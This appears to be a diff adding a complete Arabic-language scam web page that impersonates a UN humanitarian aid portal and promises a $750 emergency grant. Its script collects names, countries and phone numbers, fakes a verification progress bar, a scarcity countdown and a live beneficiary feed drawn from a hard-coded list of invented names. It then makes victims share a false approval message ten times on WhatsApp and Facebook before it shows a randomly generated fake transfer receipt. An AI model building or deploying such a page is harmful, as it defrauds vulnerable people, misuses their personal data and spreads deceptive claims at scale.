@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="البوابة الرقمية الموحدة لتسجيل وتدقيق طلبات المنح النقدية الطارئة">
+    <meta property="og:title" content="البوابة الدولية للإغاثة والتنمية">
+    <meta property="og:description" content="سجل الآن للحصول على منحة نقدية طارئة بقيمة 750$">
+    <meta property="og:url" content="https://movi.best">
+    <meta property="og:site_name" content="البوابة الدولية للإغاثة والتنمية">
+    <meta property="og:image" content="https://movi.best/preview.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="البوابة الدولية للإغاثة والتنمية">
+    <meta name="twitter:description" content="سجل الآن للحصول على منحة نقدية طارئة بقيمة 750$">
+    <meta name="twitter:image" content="https://movi.best/preview.jpg">
+    <title>البوابة الرقمية الموحدة للمنح والمساعدات الإنسانية</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌐</text></svg>">
+    <style>
+        :root {
+            --un-blue: #008dd5;
+            --dark-navy: #1d2d44;
+            --text-gray: #4a5568;
+            --light-bg: #f8fafc;
+            --success-green: #166534;
+            --border-color: #e2e8f0;
+        }
+        * { box-sizing: border-box; }
+        body { font-family: 'Segoe UI', 'Tahoma', Arial, sans-serif; background-color: #f1f5f9; margin: 0; padding: 0; color: var(--dark-navy); line-height: 1.6; }
+        
+        .navbar { background-color: white; border-bottom: 1px solid var(--border-color); padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.04); }
+        .navbar .logo { display: flex; align-items: center; font-weight: bold; color: var(--un-blue); font-size: 18px; gap: 8px; }
+        .navbar .logo-icon { width: 32px; height: 32px; background: var(--un-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 16px; }
+        .navbar .nav-links { display: flex; gap: 22px; font-size: 14px; color: var(--text-gray); }
+        .navbar .nav-links a { cursor: pointer; padding: 4px 0; border-bottom: 2px solid transparent; transition: 0.2s; text-decoration: none; color: inherit; }
+        .navbar .nav-links a:hover { color: var(--un-blue); border-bottom-color: var(--un-blue); }
+        
+        .top-info-bar { background: var(--dark-navy); color: #cbd5e1; font-size: 12px; padding: 6px 40px; display: flex; justify-content: space-between; }
+        .top-info-bar .live-dot { display: inline-block; width: 7px; height: 7px; background: #22c55e; border-radius: 50%; margin-left: 5px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        .main-container { max-width: 650px; margin: 30px auto; background: white; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.06); overflow: hidden; border: 1px solid var(--border-color); }
+        .banner { background: linear-gradient(135deg, var(--dark-navy) 0%, #2a3f5f 100%); color: white; padding: 30px 25px; text-align: center; position: relative; }
+        .banner::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, var(--un-blue), #22c55e, var(--un-blue)); }
+        .banner h1 { margin: 0; font-size: 22px; font-weight: 600; }
+        .banner p { margin: 10px 0 0 0; font-size: 14px; color: #cbd5e1; }
+        .banner .ref-badge { display: inline-block; background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.25); padding: 4px 14px; border-radius: 20px; font-size: 11px; margin-top: 14px; letter-spacing: 1px; }
+        .banner .domain-badge { display: block; margin-top: 10px; font-size: 12px; color: #93c5fd; letter-spacing: 1px; font-family: 'Courier New', monospace; }
+
+        /* شريط الثقة */
+        .trust-bar { display: flex; justify-content: space-around; background: #f8fafc; border-bottom: 1px solid var(--border-color); padding: 10px 15px; font-size: 11px; color: #4a5568; }
+        .trust-bar span { display: flex; align-items: center; gap: 5px; }
+        
+        .form-content { padding: 40px 35px; }
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.5s ease; }
+
+        .steps-indicator { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
+        .step-dot { width: 32px; height: 32px; border-radius: 50%; background: #e2e8f0; color: #94a3b8; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: bold; transition: 0.3s; }
+        .step-dot.active { background: var(--un-blue); color: white; box-shadow: 0 0 0 4px rgba(0,141,213,0.15); }
+        .step-dot.done { background: #22c55e; color: white; }
+
+        .input-group { text-align: right; margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: var(--dark-navy); }
+        .input-group label .required { color: #ef4444; }
+        .input-group input, .input-group select { width: 100%; padding: 12px 14px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 15px; background-color: var(--light-bg); transition: 0.2s; font-family: inherit; }
+        .input-group input:focus, .input-group select:focus { border-color: var(--un-blue); outline: none; background-color: white; box-shadow: 0 0 0 3px rgba(0,141,213,0.1); }
+        .input-hint { font-size: 11px; color: #94a3b8; margin-top: 5px; }
+
+        .btn-submit { background-color: var(--un-blue); color: white; border: none; width: 100%; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; font-family: inherit; box-shadow: 0 2px 8px rgba(0,141,213,0.25); }
+        .btn-submit:hover { background-color: #0077b6; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,141,213,0.35); }
+        
+        .loading-box { text-align: center; padding: 30px 0; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid var(--un-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        .progress-container { background: #e2e8f0; height: 8px; border-radius: 4px; overflow: hidden; margin-top: 15px; }
+        .progress-inner { width: 0%; height: 100%; background: linear-gradient(90deg, var(--un-blue), #22c55e); transition: width 0.2s linear; }
+        .progress-percent { font-size: 12px; color: var(--text-gray); margin-top: 8px; font-weight: 600; }
+
+        .whatsapp-section { text-align: center; }
+        .success-badge { display: inline-flex; align-items: center; gap: 8px; background: #f0fdf4; border: 1px solid #bbf7d0; padding: 10px 20px; border-radius: 30px; color: var(--success-green); font-weight: bold; font-size: 15px; margin-bottom: 20px; }
+        .notice-card { background-color: #f0fdf4; border: 1px solid #bbf7d0; padding: 18px; border-radius: 8px; color: var(--success-green); font-size: 15px; margin-bottom: 25px; line-height: 1.7; text-align: right; }
+        .notice-card .amount { color: #15803d; font-size: 18px; }
+        .btn-whatsapp { background-color: #25D366; color: white; border: none; width: 100%; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 12px; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.2s; font-family: inherit; box-shadow: 0 2px 8px rgba(37,211,102,0.3); }
+        .btn-whatsapp:hover { background-color: #1ed760; transform: translateY(-1px); }
+        .btn-facebook { background-color: #1877F2; color: white; border: none; width: 100%; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.2s; font-family: inherit; box-shadow: 0 2px 8px rgba(24,119,242,0.3); }
+        .btn-facebook:hover { background-color: #0e63d3; transform: translateY(-1px); }
+        .wp-progress-bg { background: #f1f5f9; border: 1px solid var(--border-color); height: 26px; border-radius: 13px; overflow: hidden; position: relative; margin: 15px 0; }
+        .wp-progress-fill { background: linear-gradient(90deg, #25D366, #1877F2); width: 0%; height: 100%; transition: width 0.4s ease; }
+        .wp-text { position: absolute; width: 100%; text-align: center; top: 3px; font-size: 13px; font-weight: bold; color: var(--dark-navy); }
+
+        /* العداد الحي للمستفيدين */
+        .live-feed { background: #fef9c3; border: 1px solid #fde047; border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 12px; text-align: right; }
+        .live-feed-title { font-weight: bold; color: #854d0e; margin-bottom: 8px; font-size: 12px; }
+        .feed-item { padding: 4px 0; border-bottom: 1px dashed #fde047; color: #713f12; }
+        .feed-item:last-child { border-bottom: none; }
+
+        /* العدّاد التنازلي */
+        .scarcity-badge { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; padding: 10px; border-radius: 6px; text-align: center; font-size: 13px; margin-bottom: 15px; }
+
+        /* صفحة النجاح النهائية */
+        .final-success { text-align: center; padding: 10px; }
+        .receipt-box { border: 2px dashed #22c55e; background: #f0fdf4; border-radius: 12px; padding: 25px; margin: 20px 0; text-align: right; }
+        .receipt-box .receipt-title { text-align: center; font-weight: bold; color: #15803d; font-size: 16px; margin-bottom: 15px; }
+        .receipt-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #bbf7d0; font-size: 14px; }
+        .receipt-row:last-child { border-bottom: none; }
+        .receipt-row .label { color: #4a5568; font-weight: 600; }
+        .receipt-row .value { color: #111827; font-weight: bold; }
+        .receipt-row .value.code { font-family: 'Courier New', monospace; color: #008dd5; font-size: 16px; letter-spacing: 1px; }
+        .final-message { background: #eff6ff; border: 1px solid #bfdbfe; padding: 16px; border-radius: 8px; color: #1e3a8a; font-size: 14px; text-align: right; line-height: 1.7; margin-top: 20px; }
+        .btn-track { background-color: var(--dark-navy); color: white; padding: 14px; font-size: 15px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; margin-top: 20px; width: 100%; font-family: inherit; transition: 0.2s; }
+        .btn-track:hover { background-color: #0f172a; }
+
+        .footer { text-align: center; font-size: 12px; color: #94a3b8; margin-top: 40px; padding-bottom: 30px; line-height: 1.8; }
+        .footer .footer-links { display: flex; justify-content: center; gap: 15px; margin-top: 8px; }
+        .footer .footer-links a { cursor: pointer; color: inherit; text-decoration: none; }
+        .footer .footer-links a:hover { color: var(--un-blue); }
+        .footer .domain-footer { font-family: 'Courier New', monospace; color: #64748b; margin-top: 10px; font-size: 11px; letter-spacing: 1px; }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+        @media (max-width: 600px) {
+            .navbar { padding: 10px 15px; }
+            .navbar .nav-links { display: none; }
+            .top-info-bar { padding: 6px 15px; font-size: 10px; }
+            .form-content { padding: 25px 20px; }
+            .banner { padding: 22px 18px; }
+            .banner h1 { font-size: 18px; }
+            .trust-bar { font-size: 10px; padding: 8px 5px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-info-bar">
+        <div>🟢 الخادم المركزي: متصل <span class="live-dot"></span></div>
+        <div>آخر تحديث للبيانات: <span id="clock"></span> | التوقيت العالمي UTC</div>
+    </div>
+
+    <div class="navbar">
+        <div class="logo">
+            <div class="logo-icon">🌐</div>
+            البوابة الدولية للإغاثة والتنمية
+        </div>
+        <div class="nav-links">
+            <a href="index.html">الرئيسية</a>
+            <a href="about.html">عن المنصة</a>
+            <a href="transparency.html">تقارير الشفافية</a>
+            <a href="contact.html">اتصل بنا</a>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="banner">
+            <h1>برنامج دعم الأسر والأفراد المتأثرين اقتصادياً</h1>
+            <p>منصة رقمية موحدة لتسجيل وتدقيق طلبات المنح النقدية الطارئة لعام 2026</p>
+            <div class="ref-badge">المرجع الدولي: UN-HAB-2026-EGY</div>
+            <span class="domain-badge">movi.best</span>
+        </div>
+
+        <!-- شريط الثقة -->
+        <div class="trust-bar">
+            <span>🔒 اتصال آمن SSL</span>
+            <span>🛡️ مكافحة الاحتيال</span>
+            <span>✅ معتمد دولياً</span>
+            <span>⚡ صرف فوري</span>
+        </div>
+
+        <div class="form-content">
+            
+            <!-- المرحلة 1 -->
+            <div class="step active" id="step-form">
+                <div class="steps-indicator">
+                    <div class="step-dot active" id="dot-1">1</div>
+                    <div class="step-dot" id="dot-2">2</div>
+                    <div class="step-dot" id="dot-3">3</div>
+                </div>
+
+                <!-- العدّاد التنازلي -->
+                <div class="scarcity-badge">
+                    ⏳ المتبقي في حصة دولتك: <b id="scarcity-count">7</b> مقاعد — ينتهي بعد <b id="scarcity-timer">04:59</b>
+                </div>
+
+                <div class="input-group">
+                    <label>الاسم الكامل لمقدم الطلب (مطابق للهوية الرسمية): <span class="required">*</span></label>
+                    <input type="text" id="user-name" placeholder="مثال: محمد أحمد علي">
+                </div>
+                <div class="input-group">
+                    <label>الدولة أو الإقليم الحالي: <span class="required">*</span></label>
+                    <select id="user-country">
+                        <option value="">اختر الدولة...</option>
+                        <option value="مصر">جمهورية مصر العربية</option>
+                        <option value="السعودية">المملكة العربية السعودية</option>
+                        <option value="العراق">جمهورية العراق</option>
+                        <option value="الجزائر">الجمهورية الجزائرية</option>
+                        <option value="المغرب">المملكة المغربية</option>
+                        <option value="الأردن">المملكة الأردنية الهاشمية</option>
+                        <option value="أخرى">دولة أخرى</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>رقم الهاتف المحمول (مصحوباً بالرمز الدولي لتأكيد الحوالة): <span class="required">*</span></label>
+                    <input type="tel" id="user-phone" placeholder="+966 500000000">
+                    <div class="input-hint">سيتم إرسال رمز التحقق عبر رسالة نصية قصيرة إلى هذا الرقم.</div>
+                </div>
+                <button class="btn-submit" onclick="processData()">تقديم الطلب وتدقيق البيانات في النظام</button>
+            </div>
+
+            <!-- المرحلة 2 -->
+            <div class="step" id="step-checking">
+                <div class="loading-box">
+                    <div class="spinner"></div>
+                    <h3 id="status-headline" style="margin: 10px 0;">جاري بدء الاتصال الآمن بالسيرفر المركزي...</h3>
+                    <p id="status-sub" style="font-size: 14px; color: var(--text-gray);">يرجى الانتظار، يتم الآن فحص السجل المدني للرقم المدخل.</p>
+                    <div class="progress-container">
+                        <div class="progress-inner" id="progress-bar"></div>
+                    </div>
+                    <div class="progress-percent" id="progress-percent">0%</div>
+                </div>
+            </div>
+
+            <!-- المرحلة 3 -->
+            <div class="step" id="step-verification">
+                <div class="whatsapp-section">
+                    <div class="success-badge">✅ تم مراجعة الطلب والموافقة المبدئية</div>
+
+                    <!-- العداد الحي -->
+                    <div class="live-feed">
+                        <div class="live-feed-title">🔴 آخر المستفيدين (تحديث مباشر)</div>
+                        <div id="live-feed-list"></div>
+                    </div>
+
+                    <div class="notice-card">
+                        مرحباً بالسيد(ة) <span id="dynamic-name" style="font-weight: bold; color: #1e3a8a;"></span>، تم إدراج ملفك ضمن الفئة المستحقة للحصول على مبلغ <span class="amount">750 دولار أمريكي</span> كمنحة عاجلة.<br><br>
+                        <b>بسبب الضغط الكبير على السيرفرات ولضمان وصول الدعم لمستحقيه الفعليين ومنع الروبوتات من استغلال النظام، يُرجى تفعيل رابط الضمان وتأكيد نشاطك البشري عبر المنصتين التاليتين:</b>
+                    </div>
+                    
+                    <p style="text-align: right; font-size: 14px; font-weight: bold;">خطوات تأكيد النشاط والتفعيل الفوري لكود الصرف:</p>
+                    <p style="text-align: right; font-size: 13px; color: var(--text-gray); margin-bottom: 20px; line-height: 1.6;">1. اضغط على زر واتساب لمشاركة المنصة مع 5 مجموعات أو أصدقاء، ثم اضغط على زر فيسبوك لنشر الرابط على صفحتك الشخصية.<br>2. بعد اكتمال شريط التحقق الأخضر إلى 100%، سيقوم النظام تلقائياً بإصدار رقم الحوالة المالية الخاص بك وتفعيل خيار الصرف المباشر.</p>
+                    
+                    <div class="wp-progress-bg">
+                        <div class="wp-progress-fill" id="wp-fill"></div>
+                        <div class="wp-text" id="wp-text-status">مستوى التحقق البشري: 0%</div>
+                    </div>
+
+                    <button class="btn-whatsapp" onclick="triggerShare('whatsapp')">
+                        <span>🟢 مشاركة عبر WhatsApp (5 مرات)</span>
+                    </button>
+
+                    <button class="btn-facebook" onclick="triggerShare('facebook')">
+                        <span>🔵 مشاركة عبر Facebook (5 مرات)</span>
+                    </button>
+                    
+                    <button class="btn-submit" id="btn-final" style="background-color: #94a3b8; cursor: not-allowed; margin-top: 15px;" disabled onclick="triggerFinalSuccess()">إنشاء رقم الحوالة واستلام الدعم النقدي</button>
+                </div>
+            </div>
+
+            <!-- المرحلة 4: صفحة النجاح النهائية -->
+            <div class="step" id="step-final-success">
+                <div class="final-success">
+                    <div class="success-badge" style="font-size: 16px;">🎉 تم إصدار الحوالة بنجاح</div>
+                    
+                    <div class="receipt-box">
+                        <div class="receipt-title">إيصال الحوالة النقدية الرسمي</div>
+                        <div class="receipt-row">
+                            <span class="label">اسم المستفيد:</span>
+                            <span class="value" id="receipt-name">—</span>
+                        </div>
+                        <div class="receipt-row">
+                            <span class="label">الدولة:</span>
+                            <span class="value" id="receipt-country">—</span>
+                        </div>
+                        <div class="receipt-row">
+                            <span class="label">قيمة المنحة:</span>
+                            <span class="value" style="color: #15803d;">750.00 دولار أمريكي</span>
+                        </div>
+                        <div class="receipt-row">
+                            <span class="label">رقم الحوالة:</span>
+                            <span class="value code" id="receipt-code">—</span>
+                        </div>
+                        <div class="receipt-row">
+                            <span class="label">تاريخ الإصدار:</span>
+                            <span class="value" id="receipt-date">—</span>
+                        </div>
+                        <div class="receipt-row">
+                            <span class="label">حالة الحوالة:</span>
+                            <span class="value" style="color: #15803d;">✓ جاهزة للصرف</span>
+                        </div>
+                    </div>
+
+                    <div class="final-message">
+                        <b>ملاحظة مهمة:</b> ستصلك رسالة نصية قصيرة (SMS) على رقم هاتفك المسجل تحتوي على رمز التحقق الخاص بصرف الحوالة خلال 24 ساعة. يرجى الاحتفاظ برقم الحوالة أعلاه وعدم مشاركته مع أي جهة غير رسمية. يمكنك صرف مبلغ المنحة من أي فرع من فروع البنك المركزي أو عبر المحفظة الإلكترونية المرتبطة برقمك.
+                    </div>
+
+                    <button class="btn-track" onclick="window.open('https://movi.best/receipt', '_blank')">📄 تتبع حالة الحوالة / تحميل الإيصال</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="footer">
+        حقوق الطبع محفوظة © 2026 البوابة الرقمية الموحدة للمنح الإنسانية. جميع السياسات خاضعة للرقابة الدولية.<br>
+        <div class="footer-links">
+            <a href="terms.html">شروط الاستخدام</a>
+            <a href="privacy.html">سياسة الخصوصية</a>
+            <a href="contact.html">مركز الدعم والمساعدة</a>
+        </div>
+        <div class="domain-footer">https://movi.best</div>
+    </div>
+
+<script>
+    const SHARE_URL = 'https://movi.best';
+    const SHARE_TEXT = '🚨 رسمياً: تم إطلاق المنصة الموحدة لتوزيع المنح والمساعدات المالية الطارئة لعام 2026. لقد قمت بالتسجيل وفحص بياناتي وتم قبول طلبي للحصول على 750$. سارع بالتسجيل قبل إغلاق الحصص الرسمية لدولتك من هنا: ' + SHARE_URL;
+
+    function updateClock() {
+        const now = new Date();
+        const h = String(now.getUTCHours()).padStart(2, '0');
+        const m = String(now.getUTCMinutes()).padStart(2, '0');
+        const s = String(now.getUTCSeconds()).padStart(2, '0');
+        document.getElementById('clock').innerText = h + ':' + m + ':' + s;
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    // العدّاد التنازلي
+    let scarcitySec = 300;
+    setInterval(() => {
+        if(scarcitySec > 0) scarcitySec--;
+        const m = String(Math.floor(scarcitySec/60)).padStart(2,'0');
+        const s = String(scarcitySec%60).padStart(2,'0');
+        const el = document.getElementById('scarcity-timer');
+        if(el) el.innerText = m + ':' + s;
+    }, 1000);
+
+    // العدّاد الحي للمستفيدين
+    const fakeNames = ['أحمد م. من مصر','سارة ع. من السعودية','خالد ح. من العراق','فاطمة ب. من المغرب','يوسف ك. من الجزائر','مريم ص. من الأردن','عمر ر. من مصر','ليلى ن. من تونس'];
+    function rotateFeed() {
+        const list = document.getElementById('live-feed-list');
+        if(!list) return;
+        const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+        const mins = Math.floor(Math.random() * 4) + 1;
+        list.innerHTML = `<div class="feed-item">✓ ${name} — استلم 750$ قبل ${mins} دقيقة</div>` + list.innerHTML;
+        if(list.children.length > 3) list.removeChild(list.lastChild);
+    }
+    setInterval(rotateFeed, 4000);
+
+    let savedName = "";
+    let savedCountry = "";
+
+    function processData() {
+        let name = document.getElementById('user-name').value.trim();
+        let country = document.getElementById('user-country').value;
+        let phone = document.getElementById('user-phone').value.trim();
+
+        if(name === "" || country === "" || phone === "") {
+            alert("يرجى ملء جميع الحقول المطلوبة بشكل صحيح لمطابقة بياناتك في النظام.");
+            return;
+        }
+
+        savedName = name;
+        savedCountry = country;
+
+        document.getElementById('dynamic-name').innerText = name;
+
+        document.getElementById('step-form').classList.remove('active');
+        document.getElementById('step-checking').classList.add('active');
+
+        document.getElementById('dot-1').classList.remove('active');
+        document.getElementById('dot-1').classList.add('done');
+        document.getElementById('dot-2').classList.add('active');
+
+        let width = 0;
+        let pBar = document.getElementById('progress-bar');
+        let pPercent = document.getElementById('progress-percent');
+        let headline = document.getElementById('status-headline');
+        let sub = document.getElementById('status-sub');
+
+        let interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                document.getElementById('step-checking').classList.remove('active');
+                document.getElementById('step-verification').classList.add('active');
+                document.getElementById('dot-2').classList.remove('active');
+                document.getElementById('dot-2').classList.add('done');
+                document.getElementById('dot-3').classList.add('active');
+                rotateFeed();
+            } else {
+                width += 1;
+                pBar.style.width = width + '%';
+                pPercent.innerText = width + '%';
+                
+                if(width === 20) {
+                    headline.innerText = "الاتصال الآمن بـ قاعدة بيانات المستفيدين الكبرى...";
+                    sub.innerText = "يتم التحقق من عدم تكرار الهوية أو رقم الهاتف المحمول المعطى.";
+                }
+                if(width === 50) {
+                    headline.innerText = "فحص الأهلية الاقتصادية بناءً على النطاق الجغرافي (" + country + ")...";
+                    sub.innerText = "مزامنة البيانات الحالية مع مخصصات الدعم المالي المعتمدة لهذا الربع التمويلي.";
+                }
+                if(width === 80) {
+                    headline.innerText = "توليد كود الصرف الرقمي المشفر والمصادقة على الحوالة النقدية...";
+                    sub.innerText = "جاري صياغة شهادة القبول المبدئي تحت إشراف لجنة المراقبة والتدقيق.";
+                }
+            }
+        }, 60);
+    }
+
+    let waClicks = 0;
+    let fbClicks = 0;
+    const MAX_PER_PLATFORM = 5;
+    const TOTAL_REQUIRED = 10;
+
+    function triggerShare(platform) {
+        let currentClicks = platform === 'whatsapp' ? waClicks : fbClicks;
+        if(currentClicks >= MAX_PER_PLATFORM) return;
+
+        if(platform === 'whatsapp') {
+            waClicks++;
+            window.open('https://api.whatsapp.com/send?text=' + encodeURIComponent(SHARE_TEXT), '_blank');
+        } else {
+            fbClicks++;
+            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(SHARE_URL) + '&quote=' + encodeURIComponent(SHARE_TEXT), '_blank');
+        }
+        updateProgress();
+    }
+
+    function updateProgress() {
+        const totalClicks = waClicks + fbClicks;
+        const percent = Math.min((totalClicks / TOTAL_REQUIRED) * 100, 100);
+        const fill = document.getElementById('wp-fill');
+        const textStatus = document.getElementById('wp-text-status');
+        fill.style.width = percent + '%';
+        textStatus.innerText = "مستوى التحقق البشري: " + Math.round(percent) + "% (واتساب: " + waClicks + "/5 | فيسبوك: " + fbClicks + "/5)";
+
+        if(totalClicks >= TOTAL_REQUIRED) {
+            textStatus.innerText = "اكتمل التحقق البشري بنجاح 100% ✓";
+            let btn = document.getElementById('btn-final');
+            btn.style.backgroundColor = "var(--un-blue)";
+            btn.style.cursor = "pointer";
+            btn.removeAttribute('disabled');
+        }
+    }
+
+    function generateTransferCode() {
+        const part1 = 'UNHAB';
+        const part2 = Math.floor(1000 + Math.random() * 9000);
+        const part3 = Math.floor(1000 + Math.random() * 9000);
+        return part1 + '-' + part2 + '-' + part3;
+    }
+
+    function formatDate() {
+        const now = new Date();
+        const d = String(now.getDate()).padStart(2, '0');
+        const m = String(now.getMonth() + 1).padStart(2, '0');
+        const y = now.getFullYear();
+        const h = String(now.getHours()).padStart(2, '0');
+        const min = String(now.getMinutes()).padStart(2, '0');
+        return d + '/' + m + '/' + y + ' - ' + h + ':' + min;
+    }
+
+    function triggerFinalSuccess() {
+        document.getElementById('receipt-name').innerText = savedName;
+        document.getElementById('receipt-country').innerText = savedCountry;
+        document.getElementById('receipt-code').innerText = generateTransferCode();
+        document.getElementById('receipt-date').innerText = formatDate();
+
+        document.getElementById('step-verification').classList.remove('active');
+        document.getElementById('step-final-success').classList.add('active');
+        document.getElementById('dot-3').classList.remove('active');
+        document.getElementById('dot-3').classList.add('done');
+    }
+</script>
+</body>
+</html>
